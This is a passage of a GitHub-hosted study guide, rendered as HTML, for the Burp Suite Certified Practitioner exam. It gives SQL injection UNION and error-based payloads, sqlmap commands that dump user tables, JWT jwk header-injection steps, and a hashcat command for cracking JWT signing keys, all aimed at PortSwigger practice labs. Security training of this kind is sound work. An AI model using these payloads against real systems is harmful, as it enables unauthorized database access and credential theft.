class=\"notranslate\"\u003e\u003ccode\u003e'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle\" rel=\"nofollow\"\u003ePortSwigger Lab: SQL injection attack, listing the database contents on Oracle\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSQLMAP\u003c/h3\u003e\u003ca id=\"user-content-sqlmap\" class=\"anchor\" aria-label=\"Permalink: SQLMAP\" href=\"#sqlmap\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the \u003ca href=\"https://portswigger.net/web-security/certification/takepracticeexam/index.html\" rel=\"nofollow\"\u003ePortSwigger Practice Exam APP\u003c/a\u003e we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e SQLi on the advance search function by adding a single quote and the response result in \u003ccode\u003eHTTP/2 500 Internal Server Error\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHere is my HackTheBox CPTS study notes on SQLMAP examples to bypass primitive protection WAF mechanisms. \u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/sqlmap%20Essentials.md#exercise-cases\"\u003eSQLMAP Essentials - Cases\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAfter doing some testing with SQLMAP versions \u003ccode\u003e1.7.2#stable\u003c/code\u003e and \u003ccode\u003e1.6\u003c/code\u003e, I found that both are able to exploit the PortSwigger Practice exam. Walkthrough from \u003ca href=\"https://youtu.be/yC0F05oggTE?t=563\" rel=\"nofollow\"\u003ebmdyy doing the Practice Exam using SQLMAP\u003c/a\u003e for reference of the parameters used.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927\" rel=\"nofollow\"\u003ePortSwigger Forum thread - SQLMAP\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eI took the practice exam and was able to exploit SQLi using below payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x\u0026amp;sort-by=DATE\u0026amp;writer=' \\ \n  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \\\n  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\\n  -H 'accept-language: en-US,en;q=0.9' \\\n  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \\\n  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x\u0026amp;sort-by=DATE\u0026amp;writer=' \\\n  -H 'sec-ch-ua: \u0026quot;Chromium\u0026quot;;v=\u0026quot;111\u0026quot;, \u0026quot;Not(A:Brand\u0026quot;;v=\u0026quot;8\u0026quot;' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \u0026quot;Linux\u0026quot;' \\\n  -H 'sec-fetch-dest: document' \\\n  -H 'sec-fetch-mode: navigate' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'sec-fetch-user: ?1' \\\n  -H 'upgrade-insecure-requests: 1' \\\n  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \\\n  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003esqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x\u0026amp;sort-by=DATE\u0026amp;writer=' \\ \n  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \\\n  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\\n  -H 'accept-language: en-US,en;q=0.9' \\\n  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \\\n  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x\u0026amp;sort-by=DATE\u0026amp;writer=' \\\n  -H 'sec-ch-ua: \"Chromium\";v=\"111\", \"Not(A:Brand\";v=\"8\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \"Linux\"' \\\n  -H 'sec-fetch-dest: document' \\\n  -H 'sec-fetch-mode: navigate' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'sec-fetch-user: ?1' \\\n  -H 'upgrade-insecure-requests: 1' \\\n  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \\\n  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqlmap-dump-table-data.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqlmap-dump-table-data.png\" alt=\"SQLMAP used to dump data from tables\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis is also a good start with SQLMAP to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e and extract data from a sensitive error based time delay SQL injection in advance search filters on the exam.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"sqlmap -v -u 'https://TARGET.NET/search?term=x\u0026amp;organizeby=DATE\u0026amp;journalist=\u0026amp;cachebust=1656138093.57' -p \u0026quot;term\u0026quot; --batch --cookie=\u0026quot;_lab=YESYESYESYES; session=YESYESYESYES\u0026quot; --random-agent --level=2 --risk=2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003esqlmap -v -u 'https://TARGET.NET/search?term=x\u0026amp;organizeby=DATE\u0026amp;journalist=\u0026amp;cachebust=1656138093.57' -p \"term\" --batch --cookie=\"_lab=YESYESYESYES; session=YESYESYESYES\" --random-agent --level=2 --risk=2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/2023-03-21_18-20_1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/2023-03-21_18-20_1.png\" alt=\"sqlmap 1.7.2 stable\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/sqlmapproject/sqlmap/wiki/Usage\"\u003eSQLMAP Help usage\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSQLMAP DBS to get databases.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse SQLMAP dump tables identified from \u003ccode\u003epublic\u003c/code\u003e database.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eContinueUse SQLMAP \u003ccode\u003eE\u003c/code\u003e Technique to get the \u003ccode\u003eusers\u003c/code\u003e content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eNon-Oracle Manual SQLi\u003c/h3\u003e\u003ca id=\"user-content-non-oracle-manual-sqli\" class=\"anchor\" aria-label=\"Permalink: Non-Oracle Manual SQLi\" href=\"#non-oracle-manual-sqli\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSQL injection UNION attack, determining the \u003cstrong\u003enumber of columns\u003c/strong\u003e returned by the query.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+NULL,NULL--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+NULL,NULL--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDetermined there is \u003cstrong\u003etwo\u003c/strong\u003e columns returned. Finding a column containing \u003ccode\u003etext\u003c/code\u003e, to be used for reflecting information extracted.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+'fuzzer',NULL--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003efuzzer\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e,NULL--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNext \u003cem\u003e\u003cstrong\u003eidentifying\u003c/strong\u003e\u003c/em\u003e a list of \u003cstrong\u003etables\u003c/strong\u003e in the database.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eOPTIONAL:\u003c/strong\u003e Retrieve data from other tables, use code below payload to retrieve the contents of the \u003ccode\u003eusers\u003c/code\u003e table.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+username,+password+FROM+users--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+username,+password+FROM+users--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRetrieve the names of the \u003cstrong\u003ecolumns\u003c/strong\u003e in the \u003cem\u003e\u003cstrong\u003eusers\u003c/strong\u003e\u003c/em\u003e table.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003eusers_XXXX\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFinal\u003c/strong\u003e step is to the \u003cstrong\u003edump data\u003c/strong\u003e from the username and passwords columns.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eEXTRA:\u003c/strong\u003e If you only have one column to extract text data, then concatenate multiple values in a single reflected output field using SQL syntax \u003ccode\u003e||\u003c/code\u003e characters from the database.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+NULL,username||'~'||password+FROM+users--\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'+UNION+SELECT+NULL,username||'~'||password+FROM+users--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/manual-sqli.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/manual-sqli.png\" alt=\"manual-sqli.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle\" rel=\"nofollow\"\u003ePortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eVisual error-based SQLi\u003c/h3\u003e\u003ca id=\"user-content-visual-error-based-sqli\" class=\"anchor\" aria-label=\"Permalink: Visual error-based SQLi\" href=\"#visual-error-based-sqli\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdding a single quote to the end of the \u003ccode\u003eTrackingId\u003c/code\u003e cookie value, we can \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e and confirm the SQL Injection based on the message in the response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-visual-error-based-sqli.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-visual-error-based-sqli.png\" alt=\"identify-visual-error-based-sqli.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe two payloads validate administrator record is the first record, and then to retrieve the password for the Administrator account from the \u003ccode\u003euser\u003c/code\u003e table in the database, from the columns \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;\n  \nTrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eTrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;\n  \nTrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDue to the cookie value length limit the payload is shortened by using \u003ccode\u003elimit 1\u003c/code\u003e, and the actual cookie value replace with just a letter \u003ccode\u003ex\u003c/code\u003e. SQL Injection used the \u003ca href=\"https://portswigger.net/web-security/sql-injection/blind\" rel=\"nofollow\"\u003eCAST function\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/SQL-Injection-CAST-function.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/SQL-Injection-CAST-function.png\" alt=\"SQL Injection CAST function\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based\" rel=\"nofollow\"\u003ePortSwigger Lab: Visible error-based SQL injection\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eJWT\u003c/h2\u003e\u003ca id=\"user-content-jwt\" class=\"anchor\" aria-label=\"Permalink: JWT\" href=\"#jwt\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#manual-sqli\"\u003eJWT bypass via JWK\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#jwt-weak-secret\"\u003eJWT Weak secret\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#jwt-kid-header\"\u003eJWT kid header\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#jwt-arbitrary-jku-header\"\u003eJWT arbitrary jku header\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eJSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information (\"claims\") about users as part of authentication, session handling, and access control.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eJWT bypass via JWK\u003c/h3\u003e\u003ca id=\"user-content-jwt-bypass-via-jwk\" class=\"anchor\" aria-label=\"Permalink: JWT bypass via JWK\" href=\"#jwt-bypass-via-jwk\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe burp scanner \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e vulnerability in server as, \u003cstrong\u003eJWT self-signed JWK header supported\u003c/strong\u003e. Possible to exploit it through failed check of the provided key source.\u003cbr\u003e\n\u003cstrong\u003ejwk (JSON Web Key)\u003c/strong\u003e - Provides an embedded JSON object representing the key.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAuthentication bypass Exploit steps via jwk header injection:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eNew RSA Key\u003c/li\u003e\n\u003cli\u003eIn request JWT payload, change the value of the \u003cstrong\u003esub claim\u003c/strong\u003e to administrator\u003c/li\u003e\n\u003cli\u003eSelect Attack, then select \u003cstrong\u003eEmbedded JWK\u003c/strong\u003e with newly generated RSA key\u003c/li\u003e\n\u003cli\u003eObserve a \u003ccode\u003ejwk\u003c/code\u003e parameter now contain our public key, sending request result in access to admin portal\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwk-header.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwk-header.png\" alt=\"jwk header\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection\" rel=\"nofollow\"\u003ePortSwigger Lab: JWT authentication bypass via jwk header injection\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eJWT Weak secret\u003c/h3\u003e\u003ca id=\"user-content-jwt-weak-secret\" class=\"anchor\" aria-label=\"Permalink: JWT Weak secret\" href=\"#jwt-weak-secret\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBrute force weak JWT signing key using \u003ccode\u003ehashcat\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"hashcat -a 0 -m 16500 \u0026lt;YOUR-JWT\u0026gt; /path/to/jwt.secrets.list \"\u003e\u003cpre\u003ehashcat -a 0 -m 16500 \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eYOUR-JWT\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /path/to/jwt.secrets.list 